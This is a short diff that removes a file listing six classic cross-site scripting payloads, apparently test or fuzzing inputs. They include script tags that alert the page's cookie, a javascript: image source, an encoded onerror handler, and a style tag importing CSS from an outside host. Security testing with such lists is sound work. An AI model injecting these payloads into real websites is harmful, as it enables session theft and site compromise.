@@ -1,6 +1,0 @@
-<script>alert(document.cookie);</script>
-'';!--"<XSS>=&{()}
-<IMG SRC=javascript:alert('XSS')>
-</script><script>alert('XSS');</script>
-<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
-<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
